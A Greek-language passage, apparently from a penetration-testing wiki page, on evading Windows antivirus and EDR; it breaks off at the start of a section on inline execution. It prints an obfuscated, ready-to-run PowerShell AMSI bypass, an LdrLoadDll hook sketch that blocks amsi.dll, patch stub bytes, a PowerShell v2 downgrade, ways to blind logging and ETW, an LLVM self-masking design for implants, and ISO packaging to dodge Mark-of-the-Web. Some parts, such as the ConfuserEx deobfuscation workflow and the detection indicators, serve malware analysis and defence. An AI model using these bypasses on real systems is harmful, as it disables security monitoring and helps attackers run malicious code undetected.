Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Να έχετε υπόψη ότι αυτή η ανάρτηση πιθανότατα θα επισημανθεί μόλις δημοσιευτεί, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν σκοπεύετε να παραμείνετε μη εντοπίσιμοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των δεδομένων εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Έτσι, το αποτέλεσμα της πραγματικής σάρωσης επιστρέφει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα.

### Ανακατεύθυνση του δείκτη σάρωσης AMSI COM αντί για επιδιόρθωση του `AmsiScanBuffer`

Μια άλλη παράκαμψη, τοπική στη διεργασία, αφήνει ανέπαφο το σημείο εισόδου `AmsiScanBuffer`. Στον αναφερόμενο .NET loader 64-bit, δημιουργείται ένα αντικείμενο AMSI COM από το CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`. Η `Marshal.GetIUnknownForObject()` επιστρέφει τον δείκτη της διεπαφής και η θέση vtable στο offset `0x18` χρησιμοποιείται ως στόχος της κλήσης σάρωσης. Ο loader επιδιορθώνει έναν εγγενή δείκτη για την `Console.Clear()` με ένα μικρό x64 stub, αλλάζει αυτήν την καταχώριση vtable ώστε να δείχνει στο stub μέσω της `VirtualProtect()` και, στη συνέχεια, επαναφέρει την αρχική προστασία της σελίδας. Απαραίτητες προϋποθέσεις είναι το πλάτος δείκτη 64-bit και η αναμενόμενη διάταξη COM· αυτό δεν είναι ένα γενικό offset για αυθαίρετες διεπαφές ή εκδόσεις AMSI. Τα προηγούμενα στάδια που παρατηρήθηκαν είναι η [φόρτωση sidecar υπογεγραμμένου AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) και η [αποσειριοποίηση RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Τα bytes του stub που παρατηρήθηκαν είναι `41 C7 00 01 00 00 00 33 C0 C3`: γράφουν **1** στον δείκτη αποτελέσματος στο `r8` και επιστρέφουν **0** στο `eax`. Επομένως, ο αναφερόμενος ισχυρισμός ότι το αποτέλεσμα σάρωσης είναι `AMSI_RESULT_CLEAN` (0) συγχέει την τιμή επιστροφής `S_OK` με το enum εξόδου. Σύμφωνα με τη σειρά τιμών `AMSI_RESULT` που τεκμηριώνεται, το αποτέλεσμα **1** είναι `AMSI_RESULT_NOT_DETECTED`· εξακολουθεί να βρίσκεται κάτω από το όριο ανίχνευσης.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Αποκλεισμός του AMSI εμποδίζοντας τη φόρτωση του amsi.dll (hook LdrLoadDll)

Το AMSI αρχικοποιείται μόνο μετά τη φόρτωση του `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική παράκαμψη, ανεξάρτητη από τη γλώσσα προγραμματισμού, είναι η τοποθέτηση ενός hook σε user mode στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για τη συγκεκριμένη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί με PowerShell, WScript/CScript και custom loaders (οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε το με την παροχή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), για να αποφύγετε μεγάλα ίχνη στη γραμμή εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για παράκαμψη του AMSI, το οποίο αποφεύγει τον εντοπισμό από υπογραφές χρησιμοποιώντας τυχαία ονόματα για συναρτήσεις που ορίζονται από τον χρήστη, μεταβλητές και εκφράσεις χαρακτήρων, ενώ εφαρμόζει τυχαία κεφαλαιοποίηση στους όρους του PowerShell, για να αποφύγει τον εντοπισμό από υπογραφές.

**Αφαίρεση της υπογραφής που εντοπίστηκε**

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, για να αφαιρέσετε την υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτά τα εργαλεία σαρώνουν τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και, στη συνέχεια, την αντικαθιστούν με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση της έκδοσης 2 του PowerShell**
Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή του PowerShell είναι μια λειτουργία που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για τους attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση της απομαγνητοφώνησης και της καταγραφής λειτουργικών μονάδων του PowerShell**: Για αυτόν τον σκοπό, μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Χρήση της έκδοσης 2 του PowerShell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει ελέγχους που συνδέονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Συσκότιση

> [!TIP]
> Αρκετές τεχνικές συσκότισης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ενδεχομένως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να αποκρυφτούν.

### Αποσυσκότιση .NET Binaries που προστατεύονται με ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντήσετε πολλά επίπεδα προστασίας που εμποδίζουν decompilers και sandboxes. Η παρακάτω ροή εργασίας **αποκαθιστά αξιόπιστα ένα σχεδόν αρχικό IL**, το οποίο μπορεί στη συνέχεια να γίνει decompile σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης τροποποιεί το checksum του PE, ώστε οποιαδήποτε αλλαγή να προκαλεί crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες μεταδεδομένων, να ανακτήσετε τα κλειδιά XOR και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *καθαρό* αρχείο στο **de4dot-cex** (ένα fork του de4dot με υποστήριξη ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – επιλογή του profile ConfuserEx 2
     • το de4dot αναιρεί το control-flow flattening, επαναφέρει τα αρχικά namespaces, τις classes και τα ονόματα των μεταβλητών και αποκρυπτογραφεί τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – το ConfuserEx αντικαθιστά τις άμεσες κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσχεράνει περαιτέρω το decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς συναρτήσεις-wrapper (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το δυαδικό αρχείο που προκύπτει στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider`, για να εντοπίσετε το *πραγματικό* payload.  Συχνά το malware το αποθηκεύει ως πίνακα byte με κωδικοποίηση TLV, ο οποίος αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα επαναφέρει τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε έναν offline σταθμό εργασίας.

> 🛈  Το ConfuserEx παράγει ένα προσαρμοσμένο attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μία γραμμή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), που ενισχύει την ασφάλεια του λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για την παραγωγή obfuscated κώδικα κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated λειτουργιών, οι οποίες δημιουργούνται από το framework C++ template metaprogramming, δυσκολεύοντας κάπως τη ζωή όποιου θέλει να κάνει crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα αρχεία PE, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή μεταμορφικού κώδικα για αυθαίρετα εκτελέσιμα.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM, με χρήση ROP (return-oriented programming). Κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly, μετατρέποντας τις κανονικές εντολές σε ROP chains και ανατρέποντας τη φυσική μας αντίληψη για τη συνηθισμένη ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και κατόπιν να τα φορτώσει

### Αυτο-απόκρυψη ανά συνάρτηση με υποβοήθηση compiler LLVM

Αντί να αποκρύπτεται ολόκληρο το implant μόνο όσο βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να διατηρεί επιλεγμένες συναρτήσεις XOR-masked όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει demangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό machine code και εκπέμπει έναν κοινό handler απόκρυψης στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η σύμβαση κλήσης Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός ροής ελέγχου στο backend

Αυτό πρέπει να γίνει μετά την επιλογή εντολών και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε εκπεμπόμενη εντολή επιστροφής** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο επισυναπτόμενο επίλογο και αντικαθιστά τις προηγούμενες εντολές επιστροφής με `JMP_1 handler`. Διατηρήστε οποιοδήποτε teardown της στοίβας/frame έχει παραχθεί από τον compiler πριν από κάθε επιστροφή· ανακατευθύνετε μόνο την ίδια την εντολή επιστροφής.<sup>[[38]](#references)[[39]](#references)</sup>

Οι `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs κάθε συνάρτησης, ενώ η `emitEndOfAsmFile()` εκπέμπει τον handler. Τα σύμβολα που είναι κοινά μεταξύ των σταδίων εκπομπής επιτρέπουν σε έναν κλάδο του prologue να στοχεύει τον μεταγενέστερο επίλογό του. Για ένα `je` κοντινής εμβέλειας που εκπέμπεται χειροκίνητα, γράψτε `0F 84` και στη συνέχεια την τετρα-byte MC expression `target - address_after_je`. Οι κλήσεις και τα άλματα προς τον handler μπορούν εναλλακτικά να εκπεμφθούν ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση, αν δεν έκανε καμία αλλαγή· το PoC επιστρέφει λανθασμένα `true` σε αυτή τη διαδρομή.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα κλειδί XOR και εγγραφές 16 byte που περιέχουν έναν δείκτη συνάρτησης, στον οποίο εφαρμόζει relocation ο loader, και ένα μήκος χρόνου εκτέλεσης, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στη μετατόπιση εγγραφής `+8`, καταναλώνοντας το μήκος και το padding του, και προχωρά στις εγγραφές κατά `0x10`. Τα ονόματα των PE sections έχουν μήκος μόλις οκτώ byte, επομένως η αναζήτηση χρόνου εκτέλεσης βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό RVA του entry point στο stub και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub λαμβάνει τη βάση του image από το `gs:[0x60]` → `[PEB+0x10]`, διατρέχει τα PE32+ imports για να επιλύσει ένα ήδη εισηγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά την αρχικοποίηση ορίζεται ένας sentinel στο `gs:[0xE8]` και καλούνται όλες οι συναρτήσεις των metadata. Το μόνιμα αναγνώσιμο prologue καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, ανιχνεύει τον sentinel και παρακάμπτει το σώμα, το οποίο παραμένει αποκρυπτογραφημένο. Στη συνέχεια, ο επίλογος χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` byte), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να εγγραφεί στην εγγραφή metadata της. Αφού αποκρυφτούν όλα τα σώματα, το stub εκκαθαρίζει τον sentinel και κάνει άλμα στη διεύθυνση `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη συνήθη κλήση, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στον επισυναπτόμενο επίλογο, ενώ κάθε προηγούμενη επιστροφή κάνει άλμα κατευθείαν στον κοινό handler. Ο κανονικός επίλογος χρησιμοποιεί επίσης `jmp handler` αντί για `call`, ώστε, μετά την εκ νέου απόκρυψη, το `ret` του handler να καταναλώνει τη διεύθυνση επιστροφής του αρχικού caller και να διατηρεί το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Πρωτογενής λειτουργία απόκρυψης και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (μήκους `0x46` byte σε αυτό το build), αλλάζει την υπόλοιπη περιοχή σε `PAGE_EXECUTE_READWRITE`, εφαρμόζει XOR byte προς byte με το χαμηλό byte του κλειδιού και κατόπιν την ορίζει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά κάθε κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Οι ενδείξεις υψηλής αξιοπιστίας για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε εκτελέσιμο `.stub` και ένα section `.funcmet` που περιέχει κλειδί και relocated δείκτες προς το `.text`;
- ανάλυση PEB, import table και section table πριν από το CRT, ακολουθούμενη από κλήσεις μέσω κάθε δείκτη metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά σημεία επιστροφής που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες αλλαγές προστασίας μέσω `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από το image.

Πρόκειται για αποφυγή memory scanner, όχι για κρυπτογραφική προστασία: το τροποποιημένο αρχείο εξακολουθεί να περιέχει το αρχικό, μη κρυπτογραφημένο σώμα, ενώ ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, τα αναγνώσιμα metadata και το σταθερό όριο `0x46` καθιστούν επίσης εύκολη την offline ανάκτηση.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Οι θέσεις TEB του PoC είναι τοπικές για κάθε thread, αλλά οι τροποποιημένες σελίδες κώδικα είναι κοινές σε όλη τη διεργασία. Επομένως, ταυτόχρονη ή αναδρομική είσοδος μπορεί να εναλλάσσει ξανά τις εντολές ενώ εκτελείται μια άλλη κλήση· οι εξαιρέσεις και οι μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν την εκ νέου απόκρυψη. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις αλλαγές, να επαναφέρει την προστασία που επιστράφηκε μέσω του `lpflOldProtect`, να αποφεύγει τα hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` για ευθυγράμμιση στοίβας x64 και να καλεί το `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων byte. Η Microsoft ορίζει ρητά ότι ο caller είναι υπεύθυνος για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη κατά τη λήψη ορισμένων εκτελέσιμων αρχείων από το internet και την εκτέλεσή τους.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη, πράγμα που σημαίνει ότι εφαρμογές που δεν κατεβαίνουν συχνά ενεργοποιούν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη να εκτελέσει το αρχείο (αν και το αρχείο μπορεί και πάλι να εκτελεστεί επιλέγοντας More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το internet, μαζί με τη διεύθυνση URL από την οποία έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του ADS Zone.Identifier για αρχείο που λήφθηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα αρχεία που έχουν υπογραφεί με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος να αποτρέψετε την προσθήκη Mark of The Web στα payloads σας είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου για την αποφυγή του Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO, χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής συμβάντων στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως ακριβώς απενεργοποιείται (παρακάμπτεται) το AMSI, είναι επίσης δυνατό η συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως χωρίς να καταγράφει κανένα συμβάν. Αυτό επιτυγχάνεται με την τροποποίηση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να είναι ένας πολύ καλός τρόπος για να εκτελείτε τα post-exploitation εργαλεία σας χωρίς να εντοπίζεστε από το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη, χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να μας απασχολήσει μόνο η τροποποίηση του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει την **εκκίνηση μιας νέας αναλώσιμης διεργασίας**, την εισαγωγή του κακόβουλου post-exploitation κώδικά σας στη νέα διεργασία, την εκτέλεσή του και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτή η μέθοδος έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

